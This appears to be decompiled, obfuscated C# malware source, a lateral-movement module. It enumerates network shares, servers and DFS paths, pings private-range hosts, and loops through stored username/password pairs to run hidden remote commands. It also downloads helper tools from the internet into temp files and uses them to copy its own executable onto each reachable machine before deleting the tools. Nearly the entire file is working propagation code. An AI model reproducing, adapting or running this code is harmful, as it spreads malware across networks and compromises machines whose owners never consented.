using System;
using System.Collections;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Management;
using System.Net;
using System.Net.NetworkInformation;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace UmXkJLRjSLdPF;

internal sealed class usRbxSurhfIzH
{
	public sealed class QowlCpGoAmL
	{
		private string _003CServerName_003Ek__BackingField;

		public string ServerName
		{
			get
			{
				return _003CServerName_003Ek__BackingField;
			}
			set
			{
				_003CServerName_003Ek__BackingField = value;
			}
		}
	}

	public enum vIRowEpXZwmjX
	{
		mHhwshsPYDfI = 1,
		UMNzGqiJxJavRv,
		RnWIStuNyQJAEZl,
		VVwyVMmFhBlzP,
		wHPyKdiKFatIoIqW
	}

	public enum MEqqeAeaAkebAkye
	{
		ZHieRXQbkRid,
		LMiOgCvEKZWT,
		OBWKCqtJjEbq,
		jzAAMqPBvktu
	}

	public enum MSlBAAPtolrpB
	{
		seKyAgptfCQmb = 1,
		OdCCGoSGWUjsI = 2,
		qVaxvUoDOVZIVF = 4,
		fBeXalmQhMBDq = 8,
		BWeqrOlniLx = 16,
		UFnOAUKYqoskDty = 19
	}

	public enum NYlfRPAGBv
	{
		XBMLmvnXHhCPM,
		DYiOiFqVqPCL,
		JruCoEzxMD,
		hMOhaiMdtFUqGm,
		VyuUtyJdRMpDp,
		PGErGrHWEdLN,
		QXlrrbbYPzW,
		OaVYIFZdXeP,
		yIpYSYiJjwDmRe,
		mLaavYZDVf,
		SIBUmfpLOeLeHUnlx,
		pkPxAXJWibLsrL
	}

	public sealed class dBPnNWlunGVJfo : IEnumerable
	{
		private enum dWkckUCggcfcRSnq
		{
			SrXpsBLWXEMmoHEW = 0,
			nQqFvVDRMLgDR = 259
		}

		[StructLayout(LayoutKind.Sequential)]
		private sealed class UvJdvOIVhkUFZv
		{
			public vIRowEpXZwmjX lKnNerBXhuoAUy;

			public MEqqeAeaAkebAkye YhpPiZkyaEkCFugH;

			public NYlfRPAGBv HNexBtOSIFJo;

			public MSlBAAPtolrpB rgkPqruipho;

			public string xUwBhCxoXJhnfcLh;

			public string leGTNhpeFvvDy;

			public string bSWMsCDYZj;

			public string ltLEuYfDkNACgixxu;
		}

		private ArrayList zDbWPeVtpZlRONZ = new ArrayList();

		[DllImport("Mpr.dll")]
		private static extern dWkckUCggcfcRSnq WNetOpenEnumA(vIRowEpXZwmjX dwScope, MEqqeAeaAkebAkye dwType, MSlBAAPtolrpB dwUsage, UvJdvOIVhkUFZv p, out IntPtr lphEnum);

		[DllImport("Mpr.dll")]
		private static extern dWkckUCggcfcRSnq WNetCloseEnum(IntPtr intptr_0);

		[DllImport("Mpr.dll")]
		private static extern dWkckUCggcfcRSnq WNetEnumResourceA(IntPtr intptr_0, ref uint uint_0, IntPtr intptr_1, ref uint uint_1);

		private void EnumerateServers(UvJdvOIVhkUFZv uvJdvOIVhkUFZv_0, vIRowEpXZwmjX vIRowEpXZwmjX_0, MEqqeAeaAkebAkye meqqeAeaAkebAkye_0, MSlBAAPtolrpB mslBAAPtolrpB_0, NYlfRPAGBv nylfRPAGBv_0)
		{
			uint uint_ = 16384u;
			IntPtr intPtr = Marshal.AllocHGlobal(16384);
			IntPtr lphEnum = IntPtr.Zero;
			uint uint_2 = 1u;
			if (WNetOpenEnumA(vIRowEpXZwmjX_0, meqqeAeaAkebAkye_0, mslBAAPtolrpB_0, uvJdvOIVhkUFZv_0, out lphEnum) == dWkckUCggcfcRSnq.SrXpsBLWXEMmoHEW)
			{
				dWkckUCggcfcRSnq dWkckUCggcfcRSnq;
				do
				{
					dWkckUCggcfcRSnq = WNetEnumResourceA(lphEnum, ref uint_2, intPtr, ref uint_);
					switch (dWkckUCggcfcRSnq)
					{
					case dWkckUCggcfcRSnq.nQqFvVDRMLgDR:
						continue;
					case dWkckUCggcfcRSnq.SrXpsBLWXEMmoHEW:
						Marshal.PtrToStructure(intPtr, uvJdvOIVhkUFZv_0);
						if (uvJdvOIVhkUFZv_0.HNexBtOSIFJo == nylfRPAGBv_0)
						{
							zDbWPeVtpZlRONZ.Add(uvJdvOIVhkUFZv_0.leGTNhpeFvvDy);
						}
						if ((uvJdvOIVhkUFZv_0.rgkPqruipho & MSlBAAPtolrpB.OdCCGoSGWUjsI) == MSlBAAPtolrpB.OdCCGoSGWUjsI)
						{
							EnumerateServers(uvJdvOIVhkUFZv_0, vIRowEpXZwmjX_0, meqqeAeaAkebAkye_0, mslBAAPtolrpB_0, nylfRPAGBv_0);
						}
						continue;
					}
					break;
				}
				while (dWkckUCggcfcRSnq != dWkckUCggcfcRSnq.nQqFvVDRMLgDR);
				WNetCloseEnum(lphEnum);
			}
			Marshal.FreeHGlobal(intPtr);
		}

		public dBPnNWlunGVJfo(vIRowEpXZwmjX vIRowEpXZwmjX_0, MEqqeAeaAkebAkye meqqeAeaAkebAkye_0, MSlBAAPtolrpB mslBAAPtolrpB_0, NYlfRPAGBv nylfRPAGBv_0)
		{
			UvJdvOIVhkUFZv uvJdvOIVhkUFZv_ = new UvJdvOIVhkUFZv();
			EnumerateServers(uvJdvOIVhkUFZv_, vIRowEpXZwmjX_0, meqqeAeaAkebAkye_0, mslBAAPtolrpB_0, nylfRPAGBv_0);
		}

		public IEnumerator GetEnumerator()
		{
			return zDbWPeVtpZlRONZ.GetEnumerator();
		}
	}

	[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
	public struct pOTLojVkmXg
	{
		[MarshalAs(UnmanagedType.LPWStr)]
		public string ABCxUEtexXWd;

		[MarshalAs(UnmanagedType.LPWStr)]
		public string pftvwUtDSEd;

		public uint kMdRxQFJnD;

		public uint chiHPCSVzxwUlpD;

		public IntPtr QippnThTsbCTpSoX;
	}

	[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
	public struct PRMuTiTyAPE
	{
		public int kMdRxQFJnD;

		[MarshalAs(UnmanagedType.LPWStr)]
		public string KiMcyAWMNqBokOfHX;

		[MarshalAs(UnmanagedType.LPWStr)]
		public string ovuCvzpoDxiD;
	}

	public struct AvxWhGaVGhNTD
	{
		public string tVuWLjSdXQtd;

		public string[] emjAMYUepCO;

		public AvxWhGaVGhNTD(string string_0, string[] string_1)
		{
			tVuWLjSdXQtd = string_0;
			emjAMYUepCO = string_1;
		}
	}

	private sealed class aTdgBbxqswway
	{
		public string ofsoabLwCkKe;

		public string nCkrMHzCvpd;

		[NonSerialized]
		internal static GetString getString_0;

		public void _003CRun_003Eb__1(string string_0)
		{
			if ((!string_0.StartsWith(getString_0(107358258)) && !string_0.StartsWith(getString_0(107358253)) && !string_0.StartsWith(getString_0(107358276)) && !string_0.Contains(getString_0(107359755))) || !xpAWmyCRdtHAnU(string_0))
			{
				return;
			}
			try
			{
				if (zIVCbxjNHAKEFp.LqaHPZOzRJxzwnP == getString_0(107396921))
				{
					for (int i = 0; i < nFaPwyAINX.Count; i++)
					{
						zIVCbxjNHAKEFp.LvQbqaLYCJkAZQN(getString_0(107358285), getString_0(107358231) + string_0 + getString_0(107358222) + nFaPwyAINX[i] + getString_0(107358263) + LdvcEUjrXcpYh[i]);
						Thread.Sleep(1000);
					}
				}
				else
				{
					zIVCbxjNHAKEFp.LvQbqaLYCJkAZQN(getString_0(107358285), getString_0(107358231) + string_0);
					Thread.Sleep(1000);
				}
			}
			catch
			{
			}
			if (zIVCbxjNHAKEFp.LqaHPZOzRJxzwnP == getString_0(107396921))
			{
				for (int j = 0; j < nFaPwyAINX.Count; j++)
				{
					if (zIVCbxjNHAKEFp.DbHHCuUymPJ)
					{
						if (File.Exists(ofsoabLwCkKe))
						{
							zIVCbxjNHAKEFp.LvQbqaLYCJkAZQN(ofsoabLwCkKe, getString_0(107356869) + string_0 + getString_0(107368709) + nFaPwyAINX[j] + getString_0(107368668) + LdvcEUjrXcpYh[j] + getString_0(107368659) + Assembly.GetEntryAssembly()!.Location + getString_0(107356823));
						}
					}
					else if (File.Exists(nCkrMHzCvpd))
					{
						zIVCbxjNHAKEFp.LvQbqaLYCJkAZQN(nCkrMHzCvpd, getString_0(107356869) + string_0 + getString_0(107368709) + nFaPwyAINX[j] + getString_0(107368668) + LdvcEUjrXcpYh[j] + getString_0(107369138) + Assembly.GetEntryAssembly()!.Location + getString_0(107356823));
					}
				}
			}
			else if (zIVCbxjNHAKEFp.DbHHCuUymPJ)
			{
				if (File.Exists(ofsoabLwCkKe))
				{
					zIVCbxjNHAKEFp.LvQbqaLYCJkAZQN(ofsoabLwCkKe, getString_0(107356869) + string_0 + getString_0(107369081) + Assembly.GetEntryAssembly()!.Location + getString_0(107356823));
				}
			}
			else if (File.Exists(nCkrMHzCvpd))
			{
				zIVCbxjNHAKEFp.LvQbqaLYCJkAZQN(nCkrMHzCvpd, getString_0(107356869) + string_0 + getString_0(107369048) + Assembly.GetEntryAssembly()!.Location + getString_0(107356823));
			}
		}

		static aTdgBbxqswway()
		{
			Strings.CreateGetStringDelegate(typeof(aTdgBbxqswway));
		}
	}

	private sealed class YKZXmMhohhOBVnc
	{
		public string oMkiRuinEeAnyC;

		public bool _003CGetIPAddresses_003Eb__5(string string_0)
		{
			return string_0 != oMkiRuinEeAnyC;
		}
	}

	public static List<string> yseythhyIhXpM;

	public static string hNPwdYbIDTsn;

	public static List<string> nFaPwyAINX;

	public static List<string> LdvcEUjrXcpYh;

	public static List<string> BdRQVeNNNjcw;

	[NonSerialized]
	internal static GetString getString_0;

	public static List<QowlCpGoAmL> zAExARARxoaP()
	{
		try
		{
			Process process = new Process();
			process.StartInfo.FileName = getString_0(107397196);
			process.StartInfo.Arguments = getString_0(107369172);
			process.StartInfo.CreateNoWindow = true;
			process.StartInfo.UseShellExecute = false;
			process.StartInfo.RedirectStandardOutput = true;
			process.Start();
			List<QowlCpGoAmL> list = new List<QowlCpGoAmL>();
			while (true)
			{
				if (!process.StandardOutput.EndOfStream)
				{
					string text = process.StandardOutput.ReadLine();
					if (text == getString_0(107369155))
					{
						break;
					}
					if (text != string.Empty && text[0] == '\\' && text[1] == '\\')
					{
						StringBuilder stringBuilder = new StringBuilder();
						for (int i = 2; i < text.Length && text[i] != ' '; i++)
						{
							stringBuilder.Append(text[i]);
						}
						list.Add(new QowlCpGoAmL
						{
							ServerName = getString_0(107397201) + stringBuilder.ToString() + getString_0(107369110)
						});
					}
					continue;
				}
				process.WaitForExit();
				process.Close();
				return list;
			}
			return null;
		}
		catch
		{
			return null;
		}
	}

	[DllImport("Netapi32.dll", CharSet = CharSet.Auto)]
	public static extern int NetDfsEnum([MarshalAs(UnmanagedType.LPWStr)] string NIokvobEkUTwx, int aRlxlqOeLFhVRZ, int jJLgYIcAval, out IntPtr IfvunkaFZbv, [MarshalAs(UnmanagedType.I4)] out int XsiONcGLthK, [MarshalAs(UnmanagedType.I4)] ref int QPjXePEfYTXqs);

	public static List<AvxWhGaVGhNTD> limRlFXsOsIQz(string string_0)
	{
		try
		{
			List<AvxWhGaVGhNTD> list = new List<AvxWhGaVGhNTD>();
			IntPtr IfvunkaFZbv = default(IntPtr);
			int XsiONcGLthK = 0;
			int QPjXePEfYTXqs = 0;
			if (NetDfsEnum(string_0, 3, 268435455, out IfvunkaFZbv, out XsiONcGLthK, ref QPjXePEfYTXqs) == 0)
			{
				for (int i = 0; i < XsiONcGLthK; i++)
				{
					pOTLojVkmXg pOTLojVkmXg = (pOTLojVkmXg)Marshal.PtrToStructure(IfvunkaFZbv + i * Marshal.SizeOf(typeof(pOTLojVkmXg)), typeof(pOTLojVkmXg));
					if (pOTLojVkmXg.ABCxUEtexXWd == string_0)
					{
						continue;
					}
					List<string> list2 = new List<string>();
					for (int j = 0; j < pOTLojVkmXg.chiHPCSVzxwUlpD; j++)
					{
						IntPtr ptr = new IntPtr(pOTLojVkmXg.QippnThTsbCTpSoX.ToInt64() + j * Marshal.SizeOf(typeof(PRMuTiTyAPE)));
						PRMuTiTyAPE pRMuTiTyAPE = (PRMuTiTyAPE)Marshal.PtrToStructure(ptr, typeof(PRMuTiTyAPE));
						if (pRMuTiTyAPE.kMdRxQFJnD == 2)
						{
							list2.Add(Path.Combine(new string[3]
							{
								getString_0(107356812),
								pRMuTiTyAPE.KiMcyAWMNqBokOfHX,
								pRMuTiTyAPE.ovuCvzpoDxiD
							}));
						}
					}
					string text = pOTLojVkmXg.ABCxUEtexXWd.Replace(string_0, getString_0(107359698));
					if (text.StartsWith(getString_0(107397201)))
					{
						text = text.Substring(1);
					}
					list.Add(new AvxWhGaVGhNTD(text, list2.ToArray()));
				}
			}
			return list;
		}
		catch (Exception)
		{
			return null;
		}
	}

	public static void hfTyMFtEvCj()
	{
		zIVCbxjNHAKEFp.ynZLDMzGriY(getString_0(107369133));
		List<QowlCpGoAmL> list = zAExARARxoaP();
		List<AvxWhGaVGhNTD> list2 = limRlFXsOsIQz(Environment.MachineName);
		if (list2 != null)
		{
			foreach (AvxWhGaVGhNTD item in list2)
			{
				string[] emjAMYUepCO = item.emjAMYUepCO;
				foreach (string text in emjAMYUepCO)
				{
					if (text.Contains(Environment.MachineName))
					{
						continue;
					}
					try
					{
						if (zIVCbxjNHAKEFp.LqaHPZOzRJxzwnP == getString_0(107396864))
						{
							for (int j = 0; j < nFaPwyAINX.Count; j++)
							{
								zIVCbxjNHAKEFp.LvQbqaLYCJkAZQN(getString_0(107358228), getString_0(107357559) + text + getString_0(107358165) + nFaPwyAINX[j] + getString_0(107358206) + LdvcEUjrXcpYh[j]);
							}
						}
						else
						{
							zIVCbxjNHAKEFp.LvQbqaLYCJkAZQN(getString_0(107358228), getString_0(107357559) + text);
						}
						zIVCbxjNHAKEFp.LhfteBsUpSf.Add(text.Replace(getString_0(107356761), getString_0(107359698)));
					}
					catch
					{
					}
				}
			}
		}
		if (list == null)
		{
			return;
		}
		foreach (QowlCpGoAmL item2 in list)
		{
			if (item2.ServerName.Contains(Environment.MachineName))
			{
				continue;
			}
			try
			{
				if (zIVCbxjNHAKEFp.LqaHPZOzRJxzwnP == getString_0(107396864))
				{
					for (int k = 0; k < nFaPwyAINX.Count; k++)
					{
						zIVCbxjNHAKEFp.LvQbqaLYCJkAZQN(getString_0(107358228), getString_0(107357559) + item2.ServerName + getString_0(107358165) + nFaPwyAINX[k] + getString_0(107358206) + LdvcEUjrXcpYh[k]);
					}
				}
				else
				{
					zIVCbxjNHAKEFp.LvQbqaLYCJkAZQN(getString_0(107358228), getString_0(107357559) + item2.ServerName);
				}
				zIVCbxjNHAKEFp.LhfteBsUpSf.Add(item2.ServerName.Replace(getString_0(107356761), getString_0(107359698)));
			}
			catch
			{
			}
		}
	}

	public static void LxSmaKlreUoyLA()
	{
		aTdgBbxqswway CS_0024_003C_003E8__locals0 = new aTdgBbxqswway();
		List<egIHMTYOrBYmLF> list = egIHMTYOrBYmLF.DBKApvNaoTgz();
		foreach (egIHMTYOrBYmLF item in list)
		{
			yseythhyIhXpM.Add(item.IPAddress);
		}
		CS_0024_003C_003E8__locals0.ofsoabLwCkKe = getString_0(107359698);
		CS_0024_003C_003E8__locals0.nCkrMHzCvpd = getString_0(107359698);
		try
		{
			CS_0024_003C_003E8__locals0.ofsoabLwCkKe = qEwGjDZAyZLpe();
		}
		catch
		{
		}
		try
		{
			CS_0024_003C_003E8__locals0.nCkrMHzCvpd = BaFLqiqtrrF();
		}
		catch
		{
		}
		foreach (egIHMTYOrBYmLF item2 in list)
		{
			try
			{
				if (item2.IPAddress.StartsWith(getString_0(107358201)) || item2.IPAddress.StartsWith(getString_0(107358196)) || item2.IPAddress.StartsWith(getString_0(107358219)) || item2.IPAddress.Contains(getString_0(107359698)))
				{
					qaSfnwbzylLqczO.gIHRGIrIje(item2.MacAddress, item2.IPAddress, getString_0(107369528));
				}
			}
			catch
			{
			}
		}
		try
		{
			Parallel.ForEach(yseythhyIhXpM, delegate(string string_0)
			{
				if ((string_0.StartsWith(aTdgBbxqswway.getString_0(107358258)) || string_0.StartsWith(aTdgBbxqswway.getString_0(107358253)) || string_0.StartsWith(aTdgBbxqswway.getString_0(107358276)) || string_0.Contains(aTdgBbxqswway.getString_0(107359755))) && xpAWmyCRdtHAnU(string_0))
				{
					try
					{
						if (zIVCbxjNHAKEFp.LqaHPZOzRJxzwnP == aTdgBbxqswway.getString_0(107396921))
						{
							for (int i = 0; i < nFaPwyAINX.Count; i++)
							{
								zIVCbxjNHAKEFp.LvQbqaLYCJkAZQN(aTdgBbxqswway.getString_0(107358285), aTdgBbxqswway.getString_0(107358231) + string_0 + aTdgBbxqswway.getString_0(107358222) + nFaPwyAINX[i] + aTdgBbxqswway.getString_0(107358263) + LdvcEUjrXcpYh[i]);
								Thread.Sleep(1000);
							}
						}
						else
						{
							zIVCbxjNHAKEFp.LvQbqaLYCJkAZQN(aTdgBbxqswway.getString_0(107358285), aTdgBbxqswway.getString_0(107358231) + string_0);
							Thread.Sleep(1000);
						}
					}
					catch
					{
					}
					if (zIVCbxjNHAKEFp.LqaHPZOzRJxzwnP == aTdgBbxqswway.getString_0(107396921))
					{
						for (int j = 0; j < nFaPwyAINX.Count; j++)
						{
							if (zIVCbxjNHAKEFp.DbHHCuUymPJ)
							{
								if (File.Exists(CS_0024_003C_003E8__locals0.ofsoabLwCkKe))
								{
									zIVCbxjNHAKEFp.LvQbqaLYCJkAZQN(CS_0024_003C_003E8__locals0.ofsoabLwCkKe, aTdgBbxqswway.getString_0(107356869) + string_0 + aTdgBbxqswway.getString_0(107368709) + nFaPwyAINX[j] + aTdgBbxqswway.getString_0(107368668) + LdvcEUjrXcpYh[j] + aTdgBbxqswway.getString_0(107368659) + Assembly.GetEntryAssembly()!.Location + aTdgBbxqswway.getString_0(107356823));
								}
							}
							else if (File.Exists(CS_0024_003C_003E8__locals0.nCkrMHzCvpd))
							{
								zIVCbxjNHAKEFp.LvQbqaLYCJkAZQN(CS_0024_003C_003E8__locals0.nCkrMHzCvpd, aTdgBbxqswway.getString_0(107356869) + string_0 + aTdgBbxqswway.getString_0(107368709) + nFaPwyAINX[j] + aTdgBbxqswway.getString_0(107368668) + LdvcEUjrXcpYh[j] + aTdgBbxqswway.getString_0(107369138) + Assembly.GetEntryAssembly()!.Location + aTdgBbxqswway.getString_0(107356823));
							}
						}
					}
					else if (zIVCbxjNHAKEFp.DbHHCuUymPJ)
					{
						if (File.Exists(CS_0024_003C_003E8__locals0.ofsoabLwCkKe))
						{
							zIVCbxjNHAKEFp.LvQbqaLYCJkAZQN(CS_0024_003C_003E8__locals0.ofsoabLwCkKe, aTdgBbxqswway.getString_0(107356869) + string_0 + aTdgBbxqswway.getString_0(107369081) + Assembly.GetEntryAssembly()!.Location + aTdgBbxqswway.getString_0(107356823));
						}
					}
					else if (File.Exists(CS_0024_003C_003E8__locals0.nCkrMHzCvpd))
					{
						zIVCbxjNHAKEFp.LvQbqaLYCJkAZQN(CS_0024_003C_003E8__locals0.nCkrMHzCvpd, aTdgBbxqswway.getString_0(107356869) + string_0 + aTdgBbxqswway.getString_0(107369048) + Assembly.GetEntryAssembly()!.Location + aTdgBbxqswway.getString_0(107356823));
					}
				}
			});
		}
		catch
		{
			return;
		}
		try
		{
			if (File.Exists(CS_0024_003C_003E8__locals0.ofsoabLwCkKe))
			{
				File.Delete(CS_0024_003C_003E8__locals0.ofsoabLwCkKe);
			}
		}
		catch (Exception)
		{
		}
		try
		{
			if (File.Exists(CS_0024_003C_003E8__locals0.nCkrMHzCvpd))
			{
				File.Delete(CS_0024_003C_003E8__locals0.nCkrMHzCvpd);
			}
		}
		catch (Exception)
		{
		}
	}

	public static string qEwGjDZAyZLpe()
	{
		if (IntPtr.Size == 8)
		{
			return ypehcXagBYY(new Uri(zIVCbxjNHAKEFp.wKuxNAMIkOy(getString_0(107369507))));
		}
		return ypehcXagBYY(new Uri(zIVCbxjNHAKEFp.wKuxNAMIkOy(getString_0(107369507))));
	}

	public static string BaFLqiqtrrF()
	{
		if (IntPtr.Size == 8)
		{
			return ypehcXagBYY(new Uri(zIVCbxjNHAKEFp.wKuxNAMIkOy(getString_0(107369458))));
		}
		return ypehcXagBYY(new Uri(zIVCbxjNHAKEFp.wKuxNAMIkOy(getString_0(107369381))));
	}

	public static bool xpAWmyCRdtHAnU(string string_0)
	{
		bool result = false;
		Ping ping = null;
		try
		{
			using (ping = new Ping())
			{
				PingReply pingReply = ping.Send(string_0);
				result = pingReply.Status == IPStatus.Success;
				return result;
			}
		}
		catch (PingException)
		{
			return result;
		}
		finally
		{
			ping?.Dispose();
		}
	}

	public static string ypehcXagBYY(Uri uri_0)
	{
		string path = Path.GetRandomFileName().Replace(getString_0(107368764), getString_0(107359698)).Remove(0, 3) + getString_0(107368759);
		WebClient webClient = new WebClient();
		webClient.DownloadFile(uri_0, Path.Combine(Path.GetTempPath(), path));
		return Path.Combine(Path.GetTempPath(), path);
	}

	public static List<string> BjozjHksYHjL()
	{
		//IL_0017: Unknown result type (might be due to invalid IL or missing references)
		//IL_001d: Expected O, but got Unknown
		//IL_0036: Unknown result type (might be due to invalid IL or missing references)
		//IL_003d: Expected O, but got Unknown
		string[] array = null;
		try
		{
			ArrayList arrayList = new ArrayList();
			ManagementObjectSearcher val = new ManagementObjectSearcher(getString_0(107368782));
			ManagementObjectCollection val2 = val.Get();
			ManagementObjectEnumerator enumerator = val2.GetEnumerator();
			try
			{
				while (enumerator.MoveNext())
				{
					ManagementObject val3 = (ManagementObject)enumerator.get_Current();
					if ((bool)((ManagementBaseObject)val3).get_Item(getString_0(107368717)))
					{
						string[] array2 = (string[])((ManagementBaseObject)val3).get_Item(getString_0(107368672));
						string[] array3 = array2;
						foreach (string value in array3)
						{
							arrayList.Add(value);
						}
					}
				}
			}
			finally
			{
				((IDisposable)enumerator)?.Dispose();
			}
			if (arrayList.Count > 0)
			{
				array = new string[arrayList.Count];
				arrayList.CopyTo(array);
			}
			else
			{
				array = new string[0];
			}
		}
		catch (Exception)
		{
		}
		try
		{
			if (array == null)
			{
				return null;
			}
			string[] array4 = array;
			for (int j = 0; j < array4.Length; j++)
			{
				YKZXmMhohhOBVnc CS_0024_003C_003E8__locals0 = new YKZXmMhohhOBVnc();
				CS_0024_003C_003E8__locals0.oMkiRuinEeAnyC = array4[j];
				if (CS_0024_003C_003E8__locals0.oMkiRuinEeAnyC.Contains(getString_0(107368691)))
				{
					array = array.Where((string string_0) => string_0 != CS_0024_003C_003E8__locals0.oMkiRuinEeAnyC).ToArray();
				}
			}
			return array.ToList();
		}
		catch
		{
			return null;
		}
	}

	static usRbxSurhfIzH()
	{
		Strings.CreateGetStringDelegate(typeof(usRbxSurhfIzH));
		yseythhyIhXpM = new List<string>();
		hNPwdYbIDTsn = getString_0(107359698);
		nFaPwyAINX = new List<string>
		{
			getString_0(107368686),
			getString_0(107359698)
		};
		LdvcEUjrXcpYh = new List<string>
		{
			getString_0(107368641),
			getString_0(107359698)
		};
		BdRQVeNNNjcw = new List<string>();
	}
}
